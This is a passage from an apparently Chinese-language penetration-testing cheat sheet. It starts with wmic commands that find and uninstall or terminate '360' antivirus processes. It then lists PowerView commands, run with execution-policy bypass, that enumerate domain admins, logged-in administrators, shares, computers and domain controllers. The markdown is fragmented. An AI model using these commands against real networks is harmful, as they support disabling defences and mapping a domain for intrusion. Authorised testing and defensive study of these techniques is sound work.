"name like '%360%'" get name 查看程序名``>wmic product where  call uninstall 卸载程序``>wmic process where "name like '%360%'" get name 查找进程全名``>wmic product where  call terminate 停止程序``>wmic desktop get screensaversecure,screensavertimeout 查看屏保`
```




```

### **PowerView**

**`获取域信息`**

```


```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Get-NetDomain}"
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

```


```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; get-netforest}"
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)


```

  

```
枚举管理员
```

```


```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-EnumerateLocalAdmin}"
```




```

```
![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

```

```
`查询管理在线的机器`  

```

```


```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; invoke-userhunter}"
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  



```

```
查看域内机器以administrator权限运行的进程
```

```


```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; invoke-processhunter }"
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  



```

```
或指定参数userfile和computerfile查询某台机器某个用户的进程
```

```


```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; invoke-processhunter -Userfile .\user.txt -computerfile .\host.txt}"
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  



```

```
查询域内机器共享
```

```


```
>powershell -exec bypass -Command "&{Import-Module .\powerview.ps1; Invoke-sharefinder}"
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  



```

```
查询域内机器
```

```


```
>Get-NetComputer -Domain zone.com
```




```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```
>Find-LocalAdminAccess -verbose 查询域内本地用户能登录的机器
```

![](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

```


```
`Dev-powerview``获取域控机器和win版本``>Get-DomainController |select name,osversion|fl` 
```




```


```


```